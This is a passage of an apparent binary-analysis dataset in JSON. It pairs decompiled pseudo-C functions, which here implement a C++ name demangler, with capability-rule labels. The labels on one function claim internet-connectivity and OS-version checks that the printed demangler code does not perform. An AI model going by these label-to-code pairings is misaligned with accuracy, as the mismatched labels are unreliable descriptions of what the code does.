        "decompiled_code": "\n// WARNING: Type propagation algorithm not settling\n\nuint32_t * __fastcall fcn.0042ffd0(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    char *pcVar2;\n    uint32_t uVar3;\n    int32_t in_EAX;\n    uint32_t *puVar4;\n    int32_t *piVar5;\n    uint uVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint *puVar9;\n    uint32_t *puVar10;\n    int32_t iVar11;\n    uint *puVar12;\n    char *pcVar13;\n    \n    pcVar2 = *(in_EAX + 0xc);\n    if ((*pcVar2 == 'G') || (*pcVar2 == 'T')) {\n        iVar7 = *(in_EAX + 0x2c);\n        *(in_EAX + 0x2c) = iVar7 + 0x14;\n        if (*pcVar2 == 'T') {\n            *(in_EAX + 0xc) = pcVar2 + 1;\n            if (pcVar2[1] == '\\0') {\n                return NULL;\n            }\n            *(in_EAX + 0xc) = pcVar2 + 2;\n    // switch table (52 cases) at 0x5251c0\n            switch(pcVar2[1]) {\n            case 'C':\n                uVar6 = fcn.0042ed40();\n                iVar7 = fcn.0042d650();\n                if (iVar7 < 0) {\n                    return NULL;\n                }\n                if (**(in_EAX + 0xc) == '_') {\n                    *(in_EAX + 0xc) = *(in_EAX + 0xc) + 1;\n                    fcn.0042ed40();\n                    *(in_EAX + 0x2c) = *(in_EAX + 0x2c) + 5;\n                    puVar4 = fcn.0042d480(uVar6);\n                    return puVar4;\n                }\n                return NULL;\n            default:\n                return NULL;\n            case 'F':\n                fcn.0042ed40();\n                puVar4 = fcn.0042d480(0);\n                break;\n            case 'H':\n                fcn.0042e860();\n                puVar4 = fcn.0042d480(0);\n                break;\n            case 'I':\n                fcn.0042ed40();\n                puVar4 = fcn.0042d480(0);\n                break;\n            case 'J':\n                fcn.0042ed40();\n                puVar4 = fcn.0042d480(0);\n                break;\n            case 'S':\n                fcn.0042ed40();\n                puVar4 = fcn.0042d480(0);\n                break;\n            case 'T':\n                *(in_EAX + 0x2c) = iVar7 + 10;\n                fcn.0042ed40();\n                puVar4 = fcn.0042d480(0);\n                break;\n            case 'V':\n                *(in_EAX + 0x2c) = iVar7 + 0xf;\n                fcn.0042ed40();\n                puVar4 = fcn.0042d480(0);\n                break;\n            case 'W':\n                fcn.0042e860();\n                puVar4 = fcn.0042d480(0);\n                break;\n            case 'c':\n                iVar7 = fcn.0042dba0();\n                if (iVar7 == 0) {\n                    return NULL;\n                }\n                iVar7 = fcn.0042dba0();\n                if (iVar7 != 0) {\n                    fcn.0042ffd0();\n                    puVar4 = fcn.0042d480(0);\n                    return puVar4;\n                }\n                return NULL;\n            case 'h':\n                iVar7 = fcn.0042dba0();\n                if (iVar7 != 0) {\n                    fcn.0042ffd0();\n                    puVar4 = fcn.0042d480(0);\n                    return puVar4;\n                }\n                return NULL;\n            case 'v':\n                iVar7 = fcn.0042dba0();\n                if (iVar7 == 0) {\n                    return 0;\n                }\n                fcn.0042ffd0();\n                puVar4 = fcn.0042d480(0);\n                return puVar4;\n            }\n            return puVar4;\n        }\n        if (*pcVar2 != 'G') {\n            return NULL;\n        }\n        *(in_EAX + 0xc) = pcVar2 + 1;\n        if (pcVar2[1] != '\\0') {\n            *(in_EAX + 0xc) = pcVar2 + 2;\n    // switch table (50 cases) at 0x5250f8\n            switch(pcVar2[1]) {\n            case 'A':\n                fcn.0042ffd0();\n                puVar4 = fcn.0042d480(0);\n                return puVar4;\n            default:\n                return 0;\n            case 'R':\n                fcn.0042e860();\n                uVar6 = fcn.0042d710();\n                puVar4 = fcn.0042d480(uVar6);\n                return puVar4;\n            case 'T':\n                if ((pcVar2[2] != '\\0') && (*(in_EAX + 0xc) = pcVar2 + 3,  pcVar2[2] == 'n')) {\n                    fcn.0042ffd0();\n                    puVar4 = fcn.0042d480(0);\n                    return puVar4;\n                }\n                fcn.0042ffd0();\n                puVar4 = fcn.0042d480(0);\n                return puVar4;\n            case 'V':\n                fcn.0042e860();\n                puVar4 = fcn.0042d480(0);\n                return puVar4;\n            case 'r':\n                goto code_r0x004301d0;\n            }\n        }\n        return NULL;\n    }\n    puVar4 = fcn.0042e860();\n    if (puVar4 == NULL) {\n        return NULL;\n    }\n    if ((param_2 != 0) && ((*(in_EAX + 8) & 1) == 0)) {\n        do {\n            uVar3 = *puVar4;\n            if (uVar3 != 0x4c) {\n                if (uVar3 < 0x4d) {\n                    if (4 < uVar3 - 0x1c) goto code_r0x0043002b;\n                }\n                else if (1 < uVar3 - 0x4e) {\ncode_r0x0043002b:\n                    if (uVar3 != 2) {\n                        return puVar4;\n                    }\n                    puVar10 = puVar4[3];\n                    uVar3 = *puVar10;\n                    do {\n                        if (uVar3 != 0x4c) {\n                            if (uVar3 < 0x4d) {\n                                if (4 < uVar3 - 0x1c) {\n                                    return puVar4;\n                                }\n                            }\n                            else if (1 < uVar3 - 0x4e) {\n                                return puVar4;\n                            }\n                        }\n                        puVar10 = puVar10[2];\n                        uVar3 = *puVar10;\n                        puVar4[3] = puVar10;\n                    } while( true );\n                }\n            }\n            puVar4 = puVar4[2];\n        } while( true );\n    }\n    if (**(in_EAX + 0xc) == '\\0') {\n        return puVar4;\n    }\n    puVar10 = puVar4;\n    if (**(in_EAX + 0xc) == 'E') {\n        return puVar4;\n    }\n    do {\n        uVar3 = *puVar10;\n        if (uVar3 < 0x21) {\n            if (0x1b < uVar3) goto code_r0x0043016f;\n            if (uVar3 != 2) {\n                if ((uVar3 == 4) && (puVar10 = puVar10[2],  puVar10 != NULL)) goto code_r0x004300cd;\n                break;\n            }\n            puVar10 = puVar10[3];\n        }\n        else {\n            if ((uVar3 != 0x4c) && ((uVar3 < 0x4c || (1 < uVar3 - 0x4e)))) break;\ncode_r0x0043016f:\n            puVar10 = puVar10[2];\n        }\n    } while (puVar10 != NULL);\ncode_r0x00430118:\n    piVar5 = fcn.0042faf0();\n    if (piVar5 == NULL) {\n        return NULL;\n    }\n    if (((param_2 == 0) && (*puVar4 == 2)) && (*piVar5 == 0x29)) {\n        piVar5[2] = 0;\n    }\n    puVar4 = fcn.0042d480(piVar5);\n    return puVar4;\ncode_r0x004300cd:\n    uVar3 = *puVar10;\n    if (8 < uVar3) goto code_r0x00430118;\n    if (((6 < uVar3) || (1 < uVar3 - 1)) || (puVar10 = puVar10[3],  puVar10 == NULL)) goto code_r0x00430118;\n    goto code_r0x004300cd;\ncode_r0x004301d0:\n    iVar7 = fcn.0042d650();\n    if (iVar7 < 2) {\n        return 0;\n    }\n    pcVar2 = *(in_EAX + 0xc);\n    if (*pcVar2 == '\\0') {\n        return 0;\n    }\n    pcVar13 = pcVar2 + 1;\n    *(in_EAX + 0xc) = pcVar13;\n    if (*pcVar2 != '_') {\n        return 0;\n    }\n    iVar7 = iVar7 + -1;\n    puVar9 = NULL;\n    do {\n        if (*pcVar13 == '\\0') {\n            return NULL;\n        }\n        if (*pcVar13 == '$') {\n            cVar1 = pcVar13[1];\n            if (cVar1 == 'S') {\n                uVar6 = 0x2f;\n            }\n            else if (cVar1 == '_') {\n                uVar6 = 0x2e;\n            }\n            else {\n                if (cVar1 != '$') {\n                    return NULL;\n                }\n                uVar6 = 0x24;\n            }\n            iVar11 = *(in_EAX + 0x14);\n            pcVar13 = *(in_EAX + 0xc) + 2;\n            if (*(in_EAX + 0x18) <= iVar11) {\n                *(in_EAX + 0xc) = pcVar13;\n                return NULL;\n            }\n            iVar7 = iVar7 + -2;\n            puVar12 = iVar11 * 0x10 + *(in_EAX + 0x10);\n            puVar12[1] = 0;\n            *(in_EAX + 0x14) = iVar11 + 1;\n            *puVar12 = 0x40;\n            puVar12[2] = uVar6;\n            *(in_EAX + 0xc) = pcVar13;\n        }\n        else {\n            iVar11 = 0;\n            do {\n                iVar11 = iVar11 + 1;\n                if (iVar7 <= iVar11) {\n                    iVar8 = *(in_EAX + 0x14);\n                    if (*(in_EAX + 0x18) == iVar8 || *(in_EAX + 0x18) < iVar8) goto code_r0x00430698;\n                    goto code_r0x0043063f;\n                }\n            } while ((pcVar13[iVar11] != '$') && (pcVar13[iVar11] != '\\0'));\n            iVar8 = *(in_EAX + 0x14);\n            if (*(in_EAX + 0x18) <= iVar8) {\ncode_r0x00430698:\n                *(in_EAX + 0xc) = *(in_EAX + 0xc) + iVar11;\n                return NULL;\n            }\ncode_r0x0043063f:\n            iVar7 = iVar7 - iVar11;\n            puVar12 = iVar8 * 0x10 + *(in_EAX + 0x10);\n            puVar12[1] = 0;\n            *(in_EAX + 0x14) = iVar8 + 1;\n            puVar12[2] = pcVar13;\n            iVar8 = *(in_EAX + 0xc);\n            puVar12[1] = 0;\n            pcVar13 = iVar8 + iVar11;\n            *puVar12 = 0;\n            puVar12[3] = iVar11;\n            *(in_EAX + 0xc) = pcVar13;\n        }\n        if ((puVar9 != NULL) && (puVar12 = fcn.0042d480(puVar12),  puVar12 == NULL)) {\n            return NULL;\n        }\n        puVar9 = puVar12;\n        if (iVar7 < 1) {\n            puVar4 = fcn.0042d480(0);\n            return puVar4;\n        }\n    } while( true );\n}\n",
        "token_count": 2986
    },
    "004306e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.004306e0(uint32_t *param_1, uint32_t param_2)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint uVar3;\n    uchar *in_EAX;\n    int32_t iVar4;\n    int32_t *piVar5;\n    uint32_t uVar6;\n    uint32_t *puVar7;\n    int32_t iVar8;\n    uint32_t **ppuVar9;\n    uchar *puVar10;\n    uint *puVar11;\n    char cVar12;\n    uint32_t ***pppuVar13;\n    char *pcVar14;\n    uchar *puVar15;\n    char *pcVar16;\n    uint32_t uVar17;\n    uint8_t *puVar18;\n    uint8_t *puVar19;\n    int32_t iVar20;\n    uint32_t **ppuVar21;\n    uint32_t ***pppuVar22;\n    char *pcVar23;\n    uint8_t *puVar24;\n    uint32_t ***pppuVar25;\n    uchar uVar26;\n    bool bVar27;\n    bool bVar28;\n    uchar uVar29;\n    uint32_t uStack132;\n    uint32_t **ppuStack128;\n    uint32_t **ppuStack124;\n    int32_t iStack120;\n    uint32_t *puStack108;\n    uint uStack104;\n    uint32_t **ppuStack100;\n    uchar auStack96 [4];\n    uint32_t **appuStack92 [19];\n    \n    if (param_1 == NULL) {\n        *(in_EAX + 0x118) = 1;\n        return;\n    }\n    uVar17 = param_1[1];\n    if ((1 < uVar17) || (iVar20 = *(in_EAX + 0x11c),  0x400 < iVar20)) {\n        *(in_EAX + 0x118) = 1;\n        return;\n    }\n    puStack108 = param_1;\n    param_1[1] = uVar17 + 1;\n    ppuStack128 = *(in_EAX + 0x118);\n    *(in_EAX + 0x11c) = iVar20 + 1;\n    uStack104 = *(in_EAX + 300);\n    *(in_EAX + 300) = &puStack108;\n    if (ppuStack128 != NULL) goto code_r0x004308e1;\n    uVar6 = *param_1;\n    // switch table (80 cases) at 0x5254fc\n    switch(uVar6) {\n    case 0:\n        pcVar16 = param_1[2];\n        if ((param_2 & 4) == 0) {\n            if (param_1[3] != 0) {\n                pcVar23 = pcVar16 + param_1[3];\n                iVar20 = *(in_EAX + 0x100);\n                do {\n                    cVar12 = *pcVar16;\n                    if (iVar20 == 0xff) {\n                        in_EAX[0xff] = 0;\n                        (**(in_EAX + 0x108))();\n                        *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                        iVar4 = 1;\n                        iVar20 = 0;\n                    }\n                    else {\n                        iVar4 = iVar20 + 1;\n                    }\n                    pcVar16 = pcVar16 + 1;\n                    *(in_EAX + 0x100) = iVar4;\n                    in_EAX[iVar20] = cVar12;\n                    in_EAX[0x104] = cVar12;\n                    iVar20 = iVar4;\n                } while (pcVar23 != pcVar16);\n                uVar17 = param_1[1] - 1;\n                iVar20 = *(in_EAX + 0x11c) + -1;\n            }\n        }\n        else {\n            pcVar23 = pcVar16 + param_1[3];\n            if (pcVar16 < pcVar23) {\n                do {\n                    cVar12 = *pcVar16;\n                    if ((((3 < pcVar23 - pcVar16) && (cVar12 == '_')) && (pcVar16[1] == '_')) &&\n                       ((pcVar16[2] == 'U' && (pcVar14 = pcVar16 + 3,  pcVar14 < pcVar23)))) {\n                        uStack132 = 0;\n                        do {\n                            cVar1 = *pcVar14;\n                            iVar20 = cVar1;\n                            if (cVar1 - 0x30U < 10) {\n                                iVar20 = iVar20 + -0x30;\n                            }\n                            else if (cVar1 + 0xbfU < 6) {\n                                iVar20 = iVar20 + -0x37;\n                            }\n                            else {\n                                if (5 < cVar1 + 0x9fU) {\n                                    if (((pcVar14 < pcVar23) && (uStack132 < 0x100)) && (cVar1 == '_')) {\n                                        if (*(in_EAX + 0x100) == 0xff) {\n                                            in_EAX[0xff] = 0;\n                                            (**(in_EAX + 0x108))();\n                                            *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                                            *(in_EAX + 0x100) = 0;\n                                        }\n                                        iVar20 = *(in_EAX + 0x100);\n                                        *(in_EAX + 0x100) = iVar20 + 1;\n                                        in_EAX[iVar20] = uStack132;\n                                        in_EAX[0x104] = uStack132;\n                                        goto code_r0x004335e6;\n                                    }\n                                    break;\n                                }\n                                iVar20 = iVar20 + -0x57;\n                            }\n                            pcVar14 = pcVar14 + 1;\n                            uStack132 = iVar20 + uStack132 * 0x10;\n                        } while (pcVar23 != pcVar14);\n                    }\n                    iVar4 = *(in_EAX + 0x100);\n                    iVar20 = iVar4 + 1;\n                    if (iVar4 == 0xff) {\n                        in_EAX[0xff] = 0;\n                        (**(in_EAX + 0x108))();\n                        *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                        iVar4 = 0;\n                        iVar20 = 1;\n                    }\n                    *(in_EAX + 0x100) = iVar20;\n                    in_EAX[iVar4] = cVar12;\n                    in_EAX[0x104] = cVar12;\n                    pcVar14 = pcVar16;\ncode_r0x004335e6:\n                    pcVar16 = pcVar14 + 1;\n                } while (pcVar16 < pcVar23);\n                uVar17 = param_1[1] - 1;\n                iVar20 = *(in_EAX + 0x11c) + -1;\n            }\n        }\n        break;\n    case 1:\n    case 2:\n        fcn.004306e0();\n        if ((param_2 & 4) == 0) {\n            puVar15 = 0x525296;\n            iVar20 = *(in_EAX + 0x100);\n            do {\n                uVar26 = *puVar15;\n                if (iVar20 == 0xff) {\n                    in_EAX[0xff] = 0;\n                    (**(in_EAX + 0x108))();\n                    *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                    iVar4 = 1;\n                    iVar20 = 0;\n                }\n                else {\n                    iVar4 = iVar20 + 1;\n                }\n                puVar15 = puVar15 + 1;\n                *(in_EAX + 0x100) = iVar4;\n                in_EAX[iVar20] = uVar26;\n                in_EAX[0x104] = uVar26;\n                iVar20 = iVar4;\n            } while (puVar15 != 0x525298);\n        }\n        else {\n            if (*(in_EAX + 0x100) == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                *(in_EAX + 0x100) = 0;\n            }\n            iVar20 = *(in_EAX + 0x100);\n            *(in_EAX + 0x100) = iVar20 + 1;\n            in_EAX[iVar20] = 0x2e;\n            in_EAX[0x104] = 0x2e;\n        }\n        piVar5 = param_1[3];\n        if (*piVar5 == 0x46) {\n            pcVar16 = \"{default arg#\";\n            iVar20 = *(in_EAX + 0x100);\n            do {\n                cVar12 = *pcVar16;\n                if (iVar20 == 0xff) {\n                    in_EAX[0xff] = 0;\n                    (**(in_EAX + 0x108))();\n                    *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                    iVar4 = 1;\n                    iVar20 = 0;\n                }\n                else {\n                    iVar4 = iVar20 + 1;\n                }\n                *(in_EAX + 0x100) = iVar4;\n                pcVar16 = pcVar16 + 1;\n                in_EAX[iVar20] = cVar12;\n                in_EAX[0x104] = cVar12;\n                iVar20 = iVar4;\n            } while (pcVar16 != \"\");\n            sub.msvcrt.dll_sprintf(appuStack92, 0x5252a7, piVar5[3] + 1);\n            uVar17 = 0xffffffff;\n            pppuVar22 = appuStack92;\n            do {\n                if (uVar17 == 0) break;\n                uVar17 = uVar17 - 1;\n                cVar12 = *pppuVar22;\n                pppuVar22 = pppuVar22 + 1;\n            } while (cVar12 != '\\0');\n            if (~uVar17 - 1 != 0) {\n                pppuVar22 = appuStack92;\n                pppuVar13 = (~uVar17 - 1) + pppuVar22;\n                iVar20 = *(in_EAX + 0x100);\n                do {\n                    uVar26 = *pppuVar22;\n                    if (iVar20 == 0xff) {\n                        in_EAX[0xff] = 0;\n                        (**(in_EAX + 0x108))();\n                        *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                        iVar4 = 1;\n                        iVar20 = 0;\n                    }\n                    else {\n                        iVar4 = iVar20 + 1;\n                    }\n                    *(in_EAX + 0x100) = iVar4;\n                    pppuVar22 = pppuVar22 + 1;\n                    in_EAX[iVar20] = uVar26;\n                    in_EAX[0x104] = uVar26;\n                    iVar20 = iVar4;\n                } while (pppuVar13 != pppuVar22);\n            }\n            puVar15 = 0x5252aa;\n            iVar20 = *(in_EAX + 0x100);\n            do {\n                uVar26 = *puVar15;\n                if (iVar20 == 0xff) {\n                    in_EAX[0xff] = 0;\n                    (**(in_EAX + 0x108))();\n                    *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                    iVar4 = 1;\n                    iVar20 = 0;\n                }\n                else {\n                    iVar4 = iVar20 + 1;\n                }\n                *(in_EAX + 0x100) = iVar4;\n                puVar15 = puVar15 + 1;\n                in_EAX[iVar20] = uVar26;\n                in_EAX[0x104] = uVar26;\n                iVar20 = iVar4;\n            } while (puVar15 != 0x5252ad);\n        }\n        fcn.004306e0();\n        uVar17 = param_1[1] - 1;\n        iVar20 = *(in_EAX + 0x11c) + -1;\n        break;\n    case 3:\n        uVar2 = *(in_EAX + 0x114);\n        *(in_EAX + 0x114) = 0;\n        ppuStack124 = param_1[2];\n        if (ppuStack124 == NULL) {\ncode_r0x0043468b:\n            *(in_EAX + 0x118) = 1;\n        }\n        else {\n            iStack120 = 0;\n            ppuVar21 = *(in_EAX + 0x110);\n            pppuVar22 = appuStack92;\n            pppuVar13 = NULL;\n            do {\n                pppuVar25 = pppuVar22;\n                *pppuVar25 = pppuVar13;\n                pppuVar25[2] = NULL;\n                puVar7 = *ppuStack124;\n                pppuVar25[1] = ppuStack124;\n                pppuVar25[3] = ppuVar21;\n                iStack120 = iStack120 + 1;\n                if (puVar7 != 0x4c) {\n                    if (puVar7 < 0x4d) {\n                        if (0x4 < puVar7 + -7) {\ncode_r0x0043211e:\n                            *(in_EAX + 0x114) = pppuVar25;\n                            if (puVar7 != 0x2) goto code_r0x0043212d;\n                            ppuStack124 = ppuStack124[3];\n                            if ((*ppuStack124 == 0x46) && (ppuStack124 = ppuStack124[2],  ppuStack124 == NULL))\n                            goto code_r0x0043468b;\n                            pppuVar22 = appuStack92 + iStack120 * 4;\n                            goto code_r0x004340b8;\n                        }\n                    }\n                    else if (1 < puVar7 - 0x4eU) goto code_r0x0043211e;\n                }\n                ppuStack124 = ppuStack124[2];\n                if (ppuStack124 == NULL) {\n                    *(in_EAX + 0x114) = pppuVar25;\n                    goto code_r0x0043468b;\n                }\n                pppuVar22 = pppuVar25 + 4;\n                pppuVar13 = pppuVar25;\n            } while (iStack120 != 4);\n            *(in_EAX + 0x114) = pppuVar25;\n            *(in_EAX + 0x118) = 1;\n        }\n        goto code_r0x004321ec;\n    case 4:\n        uVar2 = *(in_EAX + 0x148);\n        uVar3 = *(in_EAX + 0x114);\n        *(in_EAX + 0x148) = param_1;\n        *(in_EAX + 0x114) = 0;\n        piVar5 = param_1[2];\n        if ((((param_2 & 4) == 0) || (*piVar5 != 0)) ||\n           ((piVar5[3] != 6 || (iVar20 = sub.msvcrt.dll_strncmp(piVar5[2], \"JArray\", 6),  iVar20 != 0)))) {\n            fcn.004306e0();\n            if (in_EAX[0x104] == '<') {\n                if (*(in_EAX + 0x100) == 0xff) {\n                    in_EAX[0xff] = 0;\n                    (**(in_EAX + 0x108))();\n                    *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                    *(in_EAX + 0x100) = 0;\n                }\n                iVar20 = *(in_EAX + 0x100);\n                *(in_EAX + 0x100) = iVar20 + 1;\n                in_EAX[iVar20] = 0x20;\n                in_EAX[0x104] = 0x20;\n            }\n            iVar20 = *(in_EAX + 0x100);\n            if (iVar20 == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                iVar20 = 0;\n            }\n            *(in_EAX + 0x100) = iVar20 + 1;\n            in_EAX[iVar20] = 0x3c;\n            in_EAX[0x104] = 0x3c;\n            fcn.004306e0();\n            if (in_EAX[0x104] == '>') {\n                if (*(in_EAX + 0x100) == 0xff) {\n                    in_EAX[0xff] = 0;\n                    (**(in_EAX + 0x108))();\n                    *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                    *(in_EAX + 0x100) = 0;\n                }\n                iVar20 = *(in_EAX + 0x100);\n                *(in_EAX + 0x100) = iVar20 + 1;\n                in_EAX[iVar20] = 0x20;\n                in_EAX[0x104] = 0x20;\n            }\n            iVar20 = *(in_EAX + 0x100);\n            if (iVar20 == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                iVar20 = 0;\n            }\n            *(in_EAX + 0x100) = iVar20 + 1;\n            in_EAX[iVar20] = 0x3e;\n            in_EAX[0x104] = 0x3e;\n        }\n        else {\n            fcn.004306e0();\n            fcn.0042d5b0();\n        }\n        *(in_EAX + 0x114) = uVar3;\n        uVar17 = param_1[1];\n        *(in_EAX + 0x148) = uVar2;\n        uVar17 = uVar17 - 1;\n        iVar20 = *(in_EAX + 0x11c) + -1;\n        break;\n    case 5:\n        if (*(in_EAX + 0x120) == 0) {\n            piVar5 = fcn.0042dd10();\n            if ((piVar5 == NULL) ||\n               (((*piVar5 == 0x2f && (-1 < *(in_EAX + 0x124))) && (iVar20 = fcn.0042dcd0(),  iVar20 == 0)))) {\n                *(in_EAX + 0x118) = 1;\n                uVar17 = param_1[1] - 1;\n                iVar20 = *(in_EAX + 0x11c) + -1;\n            }\n            else {\n                puVar11 = *(in_EAX + 0x110);\n                *(in_EAX + 0x110) = *puVar11;\n                fcn.004306e0();\n                uVar17 = param_1[1];\n                *(in_EAX + 0x110) = puVar11;\n                uVar17 = uVar17 - 1;\n                iVar20 = *(in_EAX + 0x11c) + -1;\n            }\n        }\n        else {\n            pcVar16 = \"auto:\";\n            cVar12 = 'a';\n            iVar20 = *(in_EAX + 0x100);\n            while( true ) {\n                if (iVar20 == 0xff) {\n                    in_EAX[0xff] = 0;\n                    (**(in_EAX + 0x108))();\n                    *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                    iVar4 = 1;\n                    iVar20 = 0;\n                }\n                else {\n                    iVar4 = iVar20 + 1;\n                }\n                pcVar16 = pcVar16 + 1;\n                *(in_EAX + 0x100) = iVar4;\n                in_EAX[iVar20] = cVar12;\n                in_EAX[0x104] = cVar12;\n                if (pcVar16 == \"\") break;\n                cVar12 = *pcVar16;\n                iVar20 = iVar4;\n            }\n            pppuVar22 = appuStack92;\n            sub.msvcrt.dll_sprintf(pppuVar22, 0x5252a7, param_1[2] + 1);\n            pppuVar13 = pppuVar22;\n            do {\n                pppuVar25 = pppuVar13;\n                uVar6 = *pppuVar25 + 0xfefefeffU & ~*pppuVar25;\n                uVar17 = uVar6 & 0x80808080;\n                pppuVar13 = pppuVar25 + 1;\n            } while (uVar17 == 0);\n            bVar27 = (uVar6 & 0x8080) == 0;\n            if (bVar27) {\n                uVar17 = uVar17 >> 0x10;\n            }\n            if (bVar27) {\n                pppuVar13 = pppuVar25 + 6;\n            }\n            puVar15 = pppuVar13 + ((-3 - CARRY1(uVar17, uVar17)) - pppuVar22);\n            if (puVar15 != NULL) {\n                pppuVar13 = pppuVar22 + puVar15;\n                iVar20 = *(in_EAX + 0x100);\n                do {\n                    uVar26 = *pppuVar22;\n                    if (iVar20 == 0xff) {\n                        in_EAX[0xff] = 0;\n                        (**(in_EAX + 0x108))();\n                        *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                        iVar4 = 1;\n                        iVar20 = 0;\n                    }\n                    else {\n                        iVar4 = iVar20 + 1;\n                    }\n                    pppuVar22 = pppuVar22 + 1;\n                    *(in_EAX + 0x100) = iVar4;\n                    in_EAX[iVar20] = uVar26;\n                    in_EAX[0x104] = uVar26;\n                    iVar20 = iVar4;\n                } while (pppuVar13 != pppuVar22);\n            }\n            uVar17 = param_1[1] - 1;\n            iVar20 = *(in_EAX + 0x11c) + -1;\n        }\n        break;\n    case 6:\n        uVar17 = param_1[2];\n        if (uVar17 == 0) {\n            pcVar16 = \"this\";\n            cVar12 = 't';\n            iVar20 = *(in_EAX + 0x100);\n            while( true ) {\n                if (iVar20 == 0xff) {\n                    in_EAX[0xff] = 0;\n                    (**(in_EAX + 0x108))();\n                    *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                    iVar4 = 1;\n                    iVar20 = 0;\n                }\n                else {\n                    iVar4 = iVar20 + 1;\n                }\n                pcVar16 = pcVar16 + 1;\n                *(in_EAX + 0x100) = iVar4;\n                in_EAX[iVar20] = cVar12;\n                in_EAX[0x104] = cVar12;\n                if (pcVar16 == \"\") break;\n                cVar12 = *pcVar16;\n                iVar20 = iVar4;\n            }\n            uVar17 = param_1[1] - 1;\n            iVar20 = *(in_EAX + 0x11c) + -1;\n        }\n        else {\n            puVar15 = 0x525491;\n            uVar26 = 0x7b;\n            iVar20 = *(in_EAX + 0x100);\n            while( true ) {\n                if (iVar20 == 0xff) {\n                    in_EAX[0xff] = 0;\n                    (**(in_EAX + 0x108))();\n                    *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                    iVar4 = 1;\n                    iVar20 = 0;\n                }\n                else {\n                    iVar4 = iVar20 + 1;\n                }\n                *(in_EAX + 0x100) = iVar4;\n                in_EAX[iVar20] = uVar26;\n                in_EAX[0x104] = uVar26;\n                if (puVar15 == 0x525496) break;\n                uVar26 = *puVar15;\n                puVar15 = puVar15 + 1;\n                iVar20 = iVar4;\n            }\n            pppuVar22 = appuStack92;\n            sub.msvcrt.dll_sprintf(pppuVar22, 0x5252a7, uVar17);\n            pppuVar13 = pppuVar22;\n            do {\n                pppuVar25 = pppuVar13;\n                uVar6 = *pppuVar25 + 0xfefefeffU & ~*pppuVar25;\n                uVar17 = uVar6 & 0x80808080;\n                pppuVar13 = pppuVar25 + 1;\n            } while (uVar17 == 0);\n            bVar27 = (uVar6 & 0x8080) == 0;\n            if (bVar27) {\n                uVar17 = uVar17 >> 0x10;\n            }\n            if (bVar27) {\n                pppuVar13 = pppuVar25 + 6;\n            }\n            puVar15 = pppuVar13 + ((-3 - CARRY1(uVar17, uVar17)) - pppuVar22);\n            if (puVar15 != NULL) {\n                pppuVar13 = pppuVar22 + puVar15;\n                iVar20 = *(in_EAX + 0x100);\n                do {\n                    uVar26 = *pppuVar22;\n                    if (iVar20 == 0xff) {\n                        in_EAX[0xff] = 0;\n                        (**(in_EAX + 0x108))();\n                        *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                        iVar4 = 1;\n                        iVar20 = 0;\n                    }\n                    else {\n                        iVar4 = iVar20 + 1;\n                    }\n                    pppuVar22 = pppuVar22 + 1;\n                    *(in_EAX + 0x100) = iVar4;\n                    in_EAX[iVar20] = uVar26;\n                    in_EAX[0x104] = uVar26;\n                    iVar20 = iVar4;\n                } while (pppuVar13 != pppuVar22);\n            }\n            if (*(in_EAX + 0x100) == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                *(in_EAX + 0x100) = 0;\n            }\n            iVar20 = *(in_EAX + 0x100);\n            *(in_EAX + 0x100) = iVar20 + 1;\n            in_EAX[iVar20] = 0x7d;\n            in_EAX[0x104] = 0x7d;\n            uVar17 = param_1[1] - 1;\n            iVar20 = *(in_EAX + 0x11c) + -1;\n        }\n        break;\n    case 7:\n        fcn.004306e0();\n        uVar17 = param_1[1] - 1;\n        iVar20 = *(in_EAX + 0x11c) + -1;\n        break;\n    case 8:\n        if (*(in_EAX + 0x100) == 0xff) {\n            in_EAX[0xff] = 0;\n            (**(in_EAX + 0x108))();\n            *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n            *(in_EAX + 0x100) = 0;\n        }\n        iVar20 = *(in_EAX + 0x100);\n        *(in_EAX + 0x100) = iVar20 + 1;\n        in_EAX[iVar20] = 0x7e;\n        in_EAX[0x104] = 0x7e;\n        fcn.004306e0();\n        uVar17 = param_1[1] - 1;\n        iVar20 = *(in_EAX + 0x11c) + -1;\n        break;\n    case 9:\n        puVar15 = 0x5252bf;\n        uVar26 = 0x76;\n        iVar20 = 